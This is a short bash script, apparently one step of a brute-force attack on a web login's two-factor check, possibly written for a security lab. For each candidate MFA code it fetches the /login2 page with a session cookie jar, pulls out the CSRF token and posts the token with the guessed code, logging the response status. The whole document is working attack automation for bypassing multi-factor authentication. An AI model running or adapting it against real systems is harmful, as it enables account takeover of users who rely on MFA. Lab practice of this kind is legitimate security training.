#!/bin/bash

curl -s -X 'GET' -c "$3/$1.file" -b "$3/$1.file" \
    --url "$2/login2" \
    --retry 10 | grep -Po "(?<=csrf\" value=\")[^\"]*" | xargs -n1 -I@ \
        curl -s -i -X 'POST' -c "$3/$1.file" -b "$3/$1.file" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            --data "csrf=@&mfa-code=$1" \
            --url "$2/login2" \
            -w "%{response_code}: $1\n" -o "$3/$1.log"
